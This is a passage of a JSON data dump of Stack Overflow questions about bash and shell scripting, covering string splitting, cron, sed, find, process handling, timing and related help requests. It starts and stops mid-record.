\nlog_file $router--$filesave.cfg\nsend \"show running-config\\n\"  \nexpect \"end\\r\"  \nsend \"\\n\"  \nlog_file\nsend \"exit\\n\"  \nEOD\n\ncat /Users/test/Desktop/python/$router--$filesave.cfg | grep end\nexit 0\n</code></pre>\n\n<p>I just got this output</p>\n\n<pre><code>./script2 \nspawn telnet\n\ntelnet&gt; telnet&gt; \n</code></pre>\n"},{"tags":["linux","string","bash","shell","sed"],"answer_count":4,"favorite_count":1,"up_vote_count":4,"down_vote_count":0,"view_count":1769,"score":4,"question_id":9733338,"title":"Shell Script - remove first and last quote (\") from a variable","body":"<p>Below is the snippet of shell script from a larger script. It removes the quotes from the string that is held by a variable. I am doing it using sed, is it efficient? If not then what is the efficient way?</p>\n\n<pre><code>#!/bin/sh\n\nopt=\"\\\"html\\\\test\\\\\\\"\"\ntemp=`echo $opt | sed 's/.\\(.*\\)/\\1/' | sed 's/\\(.*\\)./\\1/'`\necho $temp\n</code></pre>\n"},{"tags":["bash","command","cygwin"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":22,"score":0,"question_id":13186313,"title":"cygwin: timeout syntax always fails","body":"<p>With Cygwin, I tried to use \"timeout\" to make my script sleep for a few seconds.\nBut even when I did it according to its syntax it always asks me to <code>try --help</code>, meaning I gave the wrong forms. \nHere are the things I've tried</p>\n\n<pre><code>timeout 5\n\ntimeout 5s\n\ntimeout 5.0s\n\ntimeout 5.\n</code></pre>\n\n<p>None of which worked.</p>\n\n<p>Any ideas?!</p>\n"},{"tags":["bash","shell","script","sqlplus"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":668,"score":1,"question_id":6848791,"title":"How to store multiple row output in a bash array?","body":"<p>I have a select statement</p>\n\n<pre><code>sqlplus [credentials] select variable from table;\n</code></pre>\n\n<p>It returns 6 rows and I need to store them as an array in bash array variable. </p>\n"},{"tags":["java","bash","runtime"],"answer_count":3,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":51,"score":3,"question_id":13183152,"title":"Executing shell-script with parameters from java","body":"<p>I have been googling for some time, and everyone seems to have a different solution, none of which appear to be working for me.</p>\n\n<p>I have tried both <code>ProcessBuilder</code> and <code>Runtime</code>. Both calling the <code>.sh</code> file directly and feeding it to <code>/bin/bash</code>. With no luck.</p>\n\n<p>Back to basics, my current code is as follows;</p>\n\n<pre><code>String cmd[] = { \"~/path/to/shellscript.sh\", \"foo\", \"bar\" };\nProcess p = Runtime.getRuntime().exec(cmd);\n</code></pre>\n\n<p>Which is giving a <code>No such file or directory</code> error, despite that manually running;</p>\n\n<pre><code>~/path/to/shellscript.sh foo bar\n</code></pre>\n\n<p>Works perfectly from bash.</p>\n\n<p>I need to keep the <code>~</code> because this shellscript exists in slightly different forms for three different users.</p>\n"},{"tags":["linux","windows","bash","google-chrome","color-scheme"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":10,"score":0,"question_id":13185246,"title":"Setting colorscheme for Chrome Secure Shell","body":"<p>I use Chrome Secure Shell as my SSH client. I set the background color to white and I have a hard time reading some of the color in the shell for my Ubuntu box. </p>\n\n<p>I went to 4bit Terminal Color Scheme Designer and got a nice colorscheme that I like. How do I set the color scheme for my Chrome SS terminal?</p>\n"},{"tags":["bash","lftp"],"answer_count":0,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":37,"score":1,"question_id":13183001,"title":"Continue Processing Bash Script After LFTP","body":"<p>I'd like to use lftp in the beginning of a bash script, but how do I exit lftp without stopping the script from processing? I've tried ending the lftp part with \"exit\", \"quit\", and \"bye\", but they all stop the script.</p>\n\n<p>Previously, I split into two scripts and cron'ed them to run in the right order. Is it possible to combine them into one script?</p>\n"},{"tags":["bash","process"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":28,"score":0,"question_id":13182157,"title":"Waiting for a process to end","body":"<p>I would like to run <code>n</code> processes (in my case simulations) simultaneously, so I'm using <code>&amp;</code> like so:</p>\n\n<pre><code>for i in {1..50};\ndo\n     run simulation &amp;\ndone\n</code></pre>\n\n<p>After each simulation is done I need to parse its output files. My question is how do I know when a process is done, and what do I do to invoke a function upon finishing a process? </p>\n\n<p>EDIT: I think what I need to do is call a function that would invoke the simulation and parse its files after it is done. The way I see it this function has to be a child process anyway, right?</p>\n\n<p>Thanks!</p>\n"},{"tags":["bash","script","sessionid"],"answer_count":3,"favorite_count":2,"up_vote_count":3,"down_vote_count":1,"view_count":629,"score":2,"question_id":9677306,"title":"linux command setsid","body":"<p>I am trying to write a wrapper which will execute a script as a session leader.\nI am confused by the behaviour of the linux command <code>setsid</code>. Consider this script, called <code>test.sh</code>:</p>\n\n<pre><code>#!/bin/bash\nSID=$(ps -p $$ --no-headers -o sid)\nif [ $# -ge 1 -a $$ -ne $SID ] ; then\n  setsid bash test.sh\n  echo pid=$$ ppid=$PPID sid=$SID parent\nelse\n  sleep 2\n  echo pid=$$ ppid=$PPID sid=$SID child\n  sleep 2\nfi\n</code></pre>\n\n<p>The output differs depending on whether it is executed or sourced:</p>\n\n<pre><code>$ bash\n$ SID=$(ps -p $$ --no-headers -o sid)\n$ echo pid=$$ ppid=$PPID sid=$SID\npid=9213 ppid=9104 sid= 9104\n$ ./test.sh 1 ; sleep 5\npid=9326 ppid=9324 sid= 9326 child\npid=9324 ppid=9213 sid= 9104 parent\n$ . ./test.sh 1 ; sleep 5\npid=9213 ppid=9104 sid= 9104 parent\npid=9336 ppid=1 sid= 9336 child\n$ echo $BASH_VERSION \n4.2.8(1)-release\n$ exit\nexit\n</code></pre>\n\n<p>So, it seems to me that <code>setsid</code> returns immediately when the script is sourced, but it waits for its child when the script is executed.\nWhy would the presence of a controlling tty have anything to do with <code>setsid</code>? Thanks!</p>\n\n<p>Edit: For clarification I added pid/ppid/sid reporting to all relevant commands.</p>\n"},{"tags":["osx","bash","links"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":1,"view_count":21,"score":-1,"question_id":13184448,"title":"clear command no file or directory OS X 10.8","body":"<p>So.</p>\n\n<p>I'm playing with my new MacBook (my first Mac, I usually use a Debian build virtual Linux box), right. And I'm screwing around with homebrew and fink and macports. I just removed fink and macports and, suddenly, the \"clear\" command gives me the error message:</p>\n\n<pre><code>\"-bash: /sw/bin/clear: No such file or directory\"\n</code></pre>\n\n<p>I have no idea what it's trying to say, but all I can think of is I must have done something wrong and either broken a link or removed something I really, really shouldn't have.</p>\n\n<p>Any ideas?</p>\n"},{"tags":["linux","perl","bash","ubuntu","centos"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":64,"score":1,"question_id":13182278,"title":"Does Perl have su or similar command?","body":"<blockquote>\n  <p><strong>Possible Duplicate:</strong><br>\n  <a href=\"http://stackoverflow.com/questions/4991001/how-to-successfully-run-perl-script-with-setuid-when-used-as-cgi-bin\">How to successfully run Perl script with setuid() when used as cgi-bin?</a>  </p>\n</blockquote>\n\n\n\n<p>I am running my Perl script as root, and would like to have these commands run as <code>$USER</code></p>\n\n<pre><code>mkdir bin\ncp -r /opt/gitolite .\ngitolite/install -ln\ngitolite setup -pk ${USER}.pub\nrm ${USER}.pub\n\nmkdir -p .gitolite/hooks/common\nln -s /opt/pre-receive .gitolite/hooks/common/\n</code></pre>\n\n<p><strong>Question</strong></p>\n\n<p>Does Perl have a <code>su -c \"mkdir bin\" $USER</code> or something similar?</p>\n"},{"tags":["ruby","bash","network-programming","port"],"answer_count":3,"favorite_count":4,"up_vote_count":10,"down_vote_count":0,"view_count":5087,"score":10,"question_id":517219,"title":"Ruby - See if a port is open","body":"<p>I need a quick way to find out if a given port is open with Ruby. I currently am fiddling around with this:</p>\n\n<pre><code>require 'socket'\n\ndef is_port_open?(ip, port)\n  begin\n    TCPSocket.new(ip, port)\n  rescue Errno::ECONNREFUSED\n    return false\n  end\n  return true\nend\n</code></pre>\n\n<p>It works great if the port is open, but the downside of this is that occasionally it will just sit and wait for 10-20 seconds and then eventually time out, throwing a <code>ETIMEOUT</code> exception (if the port is closed). My question is thus:</p>\n\n<p>Can this code be amended to only wait for a second (and return <code>false</code> if we get nothing back by then) or is there a better way to check if a given port is open on a given host?</p>\n\n<p><strong>Edit:</strong> Calling bash code is acceptable also as long as it works cross-platform (e.g., Mac OS X, *nix, and Cygwin), although I do prefer Ruby code.</p>\n"},{"tags":["bash","gzip"],"answer_count":1,"favorite_count":1,"up_vote_count":1,"down_vote_count":0,"view_count":30,"score":1,"question_id":13184303,"title":"Bash script: Gzip an entire folder and keep files extensions same","body":"<p>I want to gzip every file in a folder recursively and keep the original name and extension after compression.</p>\n\n<p>I have tried sudo <code>gzip -9 -r folder</code> however now each file has an .gz extension added to the original such as <code>2852b65c1d8b.css.gz</code> while I want to keep the name as <code>2852b65c1d8b.css</code> for the gzipped file to upload to Amazon S3.</p>\n"},{"tags":["bash","sh"],"answer_count":1,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":20,"score":2,"question_id":13183830,"title":"bash sequential execution timeline","body":"<p>Let's say I type in the following commands:</p>\n\n<pre><code>/usr/local/bin/wget -O \"/storehere.xml\" \"download1\" &amp;&amp; ./parse_xml;/usr/local/bin/wget -O \"/storehere.xml\" \"download2\" &amp;&amp; ./parse_xml;\n</code></pre>\n\n<p>To my understanding, the shell will execute parse_xml after download1 is retrieved and stored. However, what is not clear to me is when will the next wget command for download 2 be executed? After parse_xml is done executing (the first time of course)? Or after a request to execute parse_xml is made? If the answer it the latter one, I would like to know a way to make my script wait for a return code from parse_xml before executing the next wget.</p>\n\n<p>Thanks.</p>\n"},{"tags":["linux","bash","math"],"answer_count":4,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":47,"score":1,"question_id":13182070,"title":"Best way to divide in bash using pipes?","body":"<p>I'm just looking for an easy way to divide a number (or provide other math functions). Let's say I have the following command:</p>\n\n<pre><code>find . -name '*.mp4' | wc -l\n</code></pre>\n\n<p>How can I take the result of wc -l and divide it by 3?</p>\n\n<p>The examples I've seen don't deal with re-directed out/in</p>\n\n<p>Thanks</p>\n"},{"tags":["linux","bash","scripting"],"answer_count":13,"favorite_count":63,"up_vote_count":191,"down_vote_count":0,"view_count":219289,"score":191,"question_id":918886,"title":"Split string based on delimiter in Bash?","body":"<p>How do I split a string based on a delimiter in Bash?</p>\n\n<p>I have this string stored in a variable:</p>\n\n<pre><code>IN=\"bla@some.com;john@home.com\"\n</code></pre>\n\n<p>Now I would like to split the strings by ';' delimiter so that I have</p>\n\n<pre><code>ADDR1=\"bla@some.com\"\nADDR2=\"john@home.com\"\n</code></pre>\n\n<p>I don't necessarily need the <code>ADDR1</code> and <code>ADDR2</code> variables. If they are elements of an array that's even better.</p>\n\n<p><strong>Edit</strong>: After suggestions from the answers below, I ended up with the following which is what I was after:</p>\n\n<pre><code>#!/usr/bin/env bash\n\nIN=\"bla@some.com;john@home.com\"\n\narr=$(echo $IN | tr \";\" \"\\n\")\n\nfor x in $arr\ndo\n    echo \"&gt; [$x]\"\ndone\n</code></pre>\n\n<p>output:</p>\n\n<pre><code>&gt; [bla@some.com]\n&gt; [john@home.com]\n</code></pre>\n\n<p><strong>Edit2</strong>: There was a solution involving setting <a href=\"http://en.wikipedia.org/wiki/Internal_field_separator\">Internal_field_separator</a> (IFS) to ';'. I am not sure what happened with that answer, how do you reset IFS back to default?</p>\n\n<p><strong>Edit3</strong>: RE: IFS solution, I tried this and it works, I keep the old IFS and then restore it:</p>\n\n<pre><code>IN=\"bla@some.com;john@home.com\"\n\nOIFS=$IFS\nIFS=';'\narr2=$IN\nfor x in $arr2\ndo\n    echo \"&gt; [$x]\"\ndone\n\nIFS=$OIFS\n</code></pre>\n\n<p>BTW, when I tried </p>\n\n<pre><code>arr2=($IN) \n</code></pre>\n\n<p>I only got the first string when printing it in loop, without brackets around <code>$IN</code> it works.</p>\n"},{"tags":["bash"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":40,"score":1,"question_id":13178117,"title":"Is this an illegal syntax","body":"<p>I am attempting to write a script that will generate a random number and then make a directory called that random number and copy in a text file. I have tried everything i could think of the assign the variable but each time i get </p>\n\n<pre><code>RANDOM: command not found\nRANDOM: command not found\nbash: //small.txt: No such file or directory\nbash: //small.txt: No such file or directory\n</code></pre>\n\n<p>Below is my code</p>\n\n<pre><code>#!/bin/bash\none=$(RANDOM)\ntwo=$(RANDOM)\n\nmkdir -p $one\nmkdir -p $two\necho “BIGGGGGONgrery54y457457yytewrterytyutytytyhtytryrtyrthrthtrhrtyhrthrhtrhrthrthrthrthE”| &gt; $one/small.txt\necho “B”| &gt; $two/small.txt\necho \"finish -l test me \"\ndone\n</code></pre>\n"},{"tags":["linux","bash","unix","shell"],"answer_count":8,"favorite_count":24,"up_vote_count":52,"down_vote_count":0,"view_count":16108,"score":52,"question_id":821396,"title":"Aborting a shell script if any command returns a non-zero value?","body":"<p>I have a Bash shell script that invokes a number of commands.\nI would like to have the shell script automatically exit with a return value of 1 if any of the commands return a non-zero value.</p>\n\n<p>Is this possible without explicitly checking the result of each command?</p>\n\n<p>e.g. </p>\n\n<pre><code>dosomething1\nif [[ $? -ne 0 ]]; then\n    exit 1\nfi\n\ndosomething2\nif [[ $? -ne 0 ]]; then\n    exit 1\nfi\n</code></pre>\n"},{"tags":["bash","script","sed","awk","append"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":1,"view_count":31,"score":-1,"question_id":13181725,"title":"bash append file contents to the bottom of existing file","body":"<blockquote>\n  <p><strong>Possible Duplicate:</strong><br>\n  <a href=\"http://stackoverflow.com/questions/5586293/shell-script-to-append-text-to-each-file\">Shell script to append text to each file?</a><br>\n  <a href=\"http://stackoverflow.com/questions/6207573/how-to-append-output-to-the-end-of-text-file-in-shell-script\">How to append output to the end of text file in SHELL Script?</a>  </p>\n</blockquote>\n\n\n\n<p>I'm trying to work out the best way to insert api details into a pre-existing config. I thought about using SED to insert the contents of the api text file to the bottom of the config.inc file. I've started the script but it doesn't work and it wipes the file. </p>\n\n<pre><code>#!/bin/bash\n\nCONFIG=/home/user/config.inc\nAPI=/home/user/api.txt\n\nsed -e \"\\$a $API\" &gt; $CONFIG\n</code></pre>\n\n<p>What am I doing wrong? </p>\n\n<p>Thanks </p>\n"},{"tags":["bash","encoding","sed"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":44,"score":0,"question_id":13173891,"title":"Characters hard to substitute with sed","body":"<p>(Below since I can't paste the characters I see, <code>BB</code> will mean a character that is a square with numbers 0080 followed by a square with numbers 0094 inside).</p>\n\n<p>I've this subtitles file with an ISO-8859-15 encoding that has <code>âBB</code> instead of <code>–</code> when seen in a text editor.</p>\n\n<p>If I read the file with <code>cat</code>, the dash appears normally but if I use the file as it is it will display a <code>â€”</code> on the video subtitles.</p>\n\n<p>I tried substitutions with sed, without success:</p>\n\n<pre><code>sed 's/âBB/–/g' thisfile &gt; correctedfile\nsed 's/â€”/–/g' thisfile &gt; correctedfile\n</code></pre>\n\n<p>I tried it first in the command line and the numbered boxes fail to appear, then I tried it with a script.</p>\n\n<p>I even tried cheating with</p>\n\n<pre><code>sed 's/â../–/g' thisfile &gt; correctedfile\n</code></pre>\n\n<p>and it didn't work.</p>\n\n<p><code>cat</code> and <code>sed</code> see it perfectly as a –, so I tried </p>\n\n<pre><code>sed 's/–/–/g' thisfile &gt; correctedfile\n</code></pre>\n\n<p>but it didn't work either. </p>\n\n<p>Then I tried <code>recode iso885915..utf8 thisfile</code> and vice-versa and nothing.</p>\n\n<p>If I do a regular find and replace in <code>kate</code>, it fixes it. But since the problem is present in other files I want to solve with a <code>for; do; done</code> loop in command line, but for that I need to know how to fix one of them.</p>\n\n<p>Why these solutions didn't work, what am I missing and how to make it work?</p>\n"},{"tags":["linux","bash"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":52,"score":0,"question_id":13176569,"title":"Cron doesn't run bash script","body":"<p>I have cron</p>\n\n<blockquote>\n  <p>SHELL=/bin/bash</p>\n  \n  <p>PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin</p>\n\n<pre><code>* * * * * root  /usr/bin/flock -xn /var/lock/script.lock -c '/bin/bash /root/Dropbox/1.sh'\n</code></pre>\n</blockquote>\n\n<p>my 1.sh</p>\n\n<pre><code>#!/bin/bash -l \n\nPATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin \n\nx=1\nwhile [ $x -le 3 ] \ndo \nURL=$(head -n 1 /root/Dropbox/query.txt) \nlynx -dump  $URL | egrep '^http' &gt; /root/Dropbox/urls.txt \nx=$(( $x + 1 )) \ndone\n</code></pre>\n\n<p>Bash as default</p>\n\n<p># echo $SHELL</p>\n\n<p>/bin/bash</p>\n\n<p>Why cron doesn't run 1.sh ?</p>\n"},{"tags":["bash"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":29,"score":0,"question_id":13180669,"title":"Confusing syntax error: unexpected end of file","body":"<p>I keep getting the following error in my bash script when i attempt to run it, i can't seem to find the problem. I think it has something to do with how i am closing my loop(s). Any help would be much appreciated </p>\n\n<pre><code>bash: random: line 66: syntax error: unexpected end of file\n</code></pre>\n\n<p>Below is my code</p>\n\n<pre><code>#!/bin/bash\none=$RANDOM\ntwo=$RANDOM\n\n# Declare variable choice and assign value 4\nchoice=5\n# Print to stdout\necho \"1. -l\"\necho \"2. -m\"\necho \"3. -c\"\necho \"4. -i\"\necho -n \"Please choose a word [1,2,3,4]? \"\nwhile [ $choice -eq 5 ]; do\n\n\n  #option -l\n  if [ $choice -eq 1 ] ; then\n   #do something\n\n      else\n      echo \"Please make a choice between 1 -4 !\"\n      echo \"1.-l\"\n      echo \"2.-m\"\n      echo \"3.-c\"\n      echo \"4.-i\"\n      echo -n \"Please choose a word [1,2,3 or 4]? \"\n      choice=5\n\n      fi\n\necho\"finished\"\ndone\n</code></pre>\n\n<p>EDIT* Removed bulky code as it was causing an indent problem.</p>\n"},{"tags":["bash","unix"],"answer_count":4,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":46,"score":1,"question_id":13178859,"title":"Calculating the average each row and save into array","body":"<p>I'm trying to create the program to read each lines and calculate each line's average and store into array...For example, program will read first line, add all the numbers and divide by 24 to calculate the average which will be stored into Avg_list[1].\nWhen I try to run the program, I encounter following error, I have no idea why it  doesn't work... Can someone identify the problem?</p>\n\n<p>Code:  in Ksh</p>\n\n<pre><code> c=0\n while read -r line ; do\n     v=$line\n     set -- $v    ((g=($2+$3+$4+$5+$6+$7+$8+$9+$10+$11+$12+$13+$14+$15+$16+$17+$18+$19+$20+$21+$22+$23+$24+$25+$26)/24))\n      echo $g\n      Avg_list[${c}]=$g\n      ((c=c+1))\n  done &lt; daily.txt\n</code></pre>\n\n<p>daily.txt</p>\n\n<pre><code>CPU 55 54 54 54 54 54 54 54 54 54 54 54 54 54 54 55 54 54 55 56 57 54 57 54\nCPEAK 56 56 57 55 58 56 56 56 57 55 60 56 55 56 55 56 58 55 57 56 63 56 72 57\nRAM 97 97 97 97 97 96 96 96 96 96 96 93 91 89 86 84 90 90 95 97 97 97 97 97\nRPEAK 97 97 97 97 97 97 96 96 96 96 96 96 92 90 91 81 94 89 97 97 97 97 97 97\n</code></pre>\n\n<p>Error note:</p>\n\n<pre><code>while read -r line ; do\n        v=$line\n        set -- $v\n        ((g=($2+$3+$4+$5+$6+$7+$8+$9+$10+$11+$12+$13+$14+$15+$16+$17+$18+$19+$20+$21+$22+$23+$24+$25+$26)/24))\n        echo $g\n        Avg_list[${c}]=$g\n        ((c=c+1))\ndone &lt; daily.txt\n+ 0&lt; daily.txt\n+ read -r line\n+ v=CPU 54 54 54 54 54 54 54 54 54 54 54 54 54 54 55 54 54 55 56 57 54 57 54 54\n+ set -- CPU 54 54 54 54 54 54 54 54 54 54 54 54 54 54 55 54 54 55 56 57 54 57 54 54\n+ (( g=(54+54+54+54+54+54+54+54+CPU0+CPU1+CPU2+CPU3+CPU4+CPU5+CPU6+CPU7+CPU8+CPU9+540+541+542+543+544+545+546)/24 ))\nPerformanceAM.sh[21]: g=(54+54+54+54+54+54+54+54+CPU0+CPU1+CPU2+CPU3+CPU4+CPU5+CPU6+CPU7+CPU8+CPU9+540+541+542+543+544+545+546)/24: 0403-009 The specified number is not valid for this command.\n</code></pre>\n\n<p>EDIT </p>\n\n<pre><code>    while read -r line ; do\n    v=$line\n    set -- $v\n    ((g=${2}+${3}+${4}+${5}+${6}+${7}+${8}+${9}+${10}+${11}+${12}+${13}+${14}+${15}+${16}+${17}+${18}+${19}+${20}+${21}+${22}+${23}+${24}+${25}+${26})/24))\n    echo $g\n    Avg_list[${c}]=$g\n    ((c=c+1))\ndone &lt; daily.txt\n</code></pre>\n\n<p>New error:</p>\n\n<p>while read -r line ; do\n        v=$line\n        set -- $v\n        ((g=${2}+${3}+${4}+${5}+${6}+${7}+${8}+${9}+${10}+${11}+${12}+${13}+${14}+${15}+${16}+${17}+${18}+${19}+${20}+${21}+${22}+${23}+${24}+${25}+${26})/24)PerformanceAM.sh[18]: 0403-057 Syntax error at line 21 : `/24' is not expected.</p>\n\n<p>Thanks for your suggestions! when I tried used bracket i get this error...I'm now even more confused....it seems like it's not collecting numbers at all...</p>\n"},{"tags":["bash"],"answer_count":4,"favorite_count":0,"up_vote_count":0,"down_vote_count":1,"view_count":29,"score":-1,"question_id":13180125,"title":"Can -name values be OR'd in find?","body":"<p>I need a way to handle two files that are transferred from MS Windows applications. One is produced with a .csv extension, and the other has a .CSV extension. They also have spaces in the file names, which I can handle. </p>\n\n<p>However, but I am not quite sure how to add .CSV to the <code>-name \\*.csv</code> parameter of the following<code>find</code> command. </p>\n\n<p>Can two values be OR'd in the <code>-name</code> parameter?</p>\n\n<pre><code>for fnam in `find . -maxdepth 1 -type f -name \\*.csv -exec echo \"{}\" \\;` \ndo\n.\n.\n.\n</code></pre>\n"},{"tags":["bash"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":31,"score":0,"question_id":13180451,"title":"Show cpu usage with bash script and print in txt file","body":"<p>I have a question. </p>\n\n<p>I need to do a bash script command that show me CPU usage and stamp in an external txt file.</p>\n\n<p>Have some idea? Thank all so much!</p>\n"},{"tags":["bash","shell","text","ksh"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":25,"score":0,"question_id":13175502,"title":"How do I arbitrarily reorder lines in a text file using a Unix shell?","body":"<p>I've got a text file with an arbitrary number of lines, e.g.:</p>\n\n<pre><code>one line\nsome other line\nan additional line\none more here\n</code></pre>\n\n<p>I'd like to write a script to reorder those lines based on a given order. e.g. </p>\n\n<ul>\n<li>An input of 2 1 3 4 would swap the first and second lines.</li>\n<li>An input of 3 1 2 4 would put the 3rd line first, the 1st line second, the 2nd line third and keep the 4th line fourth.</li>\n</ul>\n\n<p>I could hack something together, but I'm wondering if there's an elegant solution?</p>\n\n<p>I can use either bash or ksh.</p>\n"},{"tags":["perl","bash"],"answer_count":4,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":97,"score":0,"question_id":13178485,"title":"How to execute many (~15) bash commands in Perl?","body":"<p>I know of <code>system()</code> and <code>qx()</code>, but I need to execute ~15 bash commands. E.g.</p>\n\n<p><code>mkdir</code>, <code>chown</code>, <code>edquota -p user1 -u user2</code>, <code>cp -r</code>, <code>su - username</code>, <code>git</code>, <code>rm</code>, <code>ln -s</code></p>\n\n<p><strong>Question</strong></p>\n\n<p>Is there an efficient way to execute many Bash commands in Perl?</p>\n\n<p>I don't care in this case about the output.</p>\n"},{"tags":["r","bash"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":40,"score":0,"question_id":13178222,"title":"Binning decimal data and plotting an histogram","body":"<p>I have a dataset in a file, which looks like this:</p>\n\n<pre><code>0.0707526823\n0.4859753978\n0.0084166789\n0.0694709558\n0.0156410467\n0.3783259831\n0.8977261856\n0.7981824881\n0.2079852045\n0.9498437264\n0.9264972044\n0.1878358734\n0.0020816686\n0.0024611297\n0.4250464895\n0.0725748666\n0.0407962054\n0.8282363221\n0.8408343333\n0.7129760016\n0.2772250135\n0.3677588953\n0.4723908637\n0.9452814318\n</code></pre>\n\n<p>I want to bin this data with an interval of 0.1 and plot a histogram. </p>\n\n<p>I did try using R,</p>\n\n<p>and here what I was doing</p>\n\n<pre><code>x&lt;-read.table(\"filex\", header=T)\nbreaks=seq (min, max, step)\nhist (x$col1, breaks)\n</code></pre>\n\n<p>but this command is not working in my case :(  </p>\n\n<p>Any one liner in awk, or R is welcomed</p>\n\n<p>Thank you</p>\n"},{"tags":["bash"],"answer_count":4,"favorite_count":0,"up_vote_count":0,"down_vote_count":1,"view_count":42,"score":-1,"question_id":13178038,"title":"How to add text in a txt file with bash scripting","body":"<p>i have a question. I need to add a text line into a txt file. This is my file:</p>\n\n<ul>\n<li>000 </li>\n<li>001 test1</li>\n<li>002 test2</li>\n<li>003 test3</li>\n<li>004</li>\n<li>005 test4</li>\n<li>006 test5</li>\n<li>007 test6</li>\n</ul>\n\n<p>I need with bash scripting to add text in line 000 and 004. </p>\n\n<p>How can i do?\nThanks to all!</p>\n"},{"tags":["bash","virtualbox"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":14,"score":0,"question_id":13177702,"title":"Execute Command after VM Booted","body":"<p>I've gotten sick of how many steps it takes me to get started in the morning.  Yes it only takes me a few minutes to start up my whole environment, but I'd really rather just run a single command on boot-up and be ready to go immediately.</p>\n\n<p>I'm writing an app on Rails connected to SqlServer.  To develop for it I have a local version of the DB I use on a VM.  My manual process goes like this:</p>\n\n<pre><code>Run VirtualBox.\nStart the VM.\n     When the VM is done booting:\n          Open terminal\n          Run `rails s`\n          When rails is done starting:\n                 open browser\n                 navigate to localhost:3000 and start developing\nRun Sublime\n</code></pre>\n\n<p>I'd love to do this in one script:</p>\n\n<pre><code>VirtualBox Windows7 &amp;\nsublime &amp;\ngoogle-chrome &amp;\n</code></pre>\n\n<p>But I can't figure out how to run this command <em>only</em> once the VM is done booting:</p>\n\n<pre><code>gnome-terminal --working-directory=git/my_project --tab -e 'rails s' --tab -e 'git status'\n</code></pre>\n\n<p>Also, it'd be nice (but not necessary) to have chrome start <em>after</em> rails s has succeeded.</p>\n\n<p>Is this even possible?</p>\n"},{"tags":["regex","bash","sed"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":39,"score":0,"question_id":13177153,"title":"sed print line from regex to regex","body":"<p>I have a file with the following text:</p>\n\n<pre><code>text\nSTART\nThis\nhas\nto\nbe\nprinted\nSTOP\nmore text\n</code></pre>\n\n<p>Now i want the text in between START and STOP to be printed.\nI wrote the following:</p>\n\n<pre><code>cat file | sed '/START/,/STOP/p'\n</code></pre>\n\n<p>But that does not seem to be doing what i want. Any suggestions?</p>\n"},{"tags":["bash"],"answer_count":2,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":32,"score":3,"question_id":13176611,"title":"bash script write executing time in a file","body":"<p>I need to write the time taken to execute this command in a txt file:</p>\n\n<pre><code>time ./program.exe\n</code></pre>\n\n<p>How can I do in bash script?</p>\n\n<p>I try with <code>&gt;&gt; time.txt</code> but that doesn't work (the output does not go to file and does go to the screen).</p>\n"},{"tags":["bash","echo","kubuntu"],"answer_count":3,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":26,"score":2,"question_id":13175886,"title":"Bash echo outputting text in middle of concatenated string","body":"<p>Preamble:\nSo I have a project whereby I need to run a conversion tool on a bunch of files. There are multiple steps to the conversion, and it can take a while. Since these files aren't necessarily in the same directory, I created a text file with the filenames to convert:</p>\n\n<pre><code>&lt;filenames.txt&gt;\n\n/home/me/Documents/file1.txt\n/home/me/Documents/file2.txt\n/home/me/Documents/file3.txt\n</code></pre>\n\n<p>Problem:\nI then have a bash script to run over these files, and do the conversion steps. However, I try and echo the phase and filename, and echo, in this case, sticks the echo'd text in the middle of the filename:</p>\n\n<pre><code>&lt;script.sh&gt;\n\ncat filenames.txt | while read some_file\ndo\n    echo\n    echo \"Begin FORMAT_A to FORMAT_B conversion...\"\n    echo \"FORMAT_A Filename:\"\n    echo $some_file\n    formatb_dir= dirname $some_file | tr '\\n' \"/\"\n    formatb_file= basename $some_file \".xml\" | tr '\\n' \"_\"\n    formatb=$formatb_dir$formatb_file\"form_b.xml\\n\"\n\n    echo \"FORMAT_B Filename:\"\n    echo $formatb\ndone\n</code></pre>\n\n<p>Produces output like this:</p>\n\n<pre><code>Begin FORMAT_A to FORMAT_B conversion...\nFORMAT_A Filename:\n/home/me/Documents/file1.txt\n/home/me/Documents/file1.txt_FORMAT_B Filename:\nform_b.xml\n\n\nBegin FORMAT_A to FORMAT_B conversion...\nFORMAT_A Filename:\n/home/me/Documents/file2.txt\n/home/me/Documents/file2.txt_FORMAT_B Filename:\nform_b.xml\n\n\nBegin FORMAT_A to FORMAT_B conversion...\nFORMAT_A Filename:\n/home/me/Documents/file3.txt\n/home/me/Documents/file3.txt_FORMAT_B Filename:\nform_b.xml\n</code></pre>\n\n<p>\"FORMAT_B Filename\", the echo'd text, has appeared before the appended text \"form_b.xml\".</p>\n\n<p>I looked at the man pages for dirname, basename, echo and tr, but I didn't spot anything that looks like it'd cause what I'm seeing. I tried looking around on Google, but I'm not sure I'm asking the right questions (\"bash echo text before variable\"?). </p>\n\n<p>Question: <strong>Why is my echo putting the echo'd text in the middle of my variable?</strong></p>\n\n<p>(possible related question: 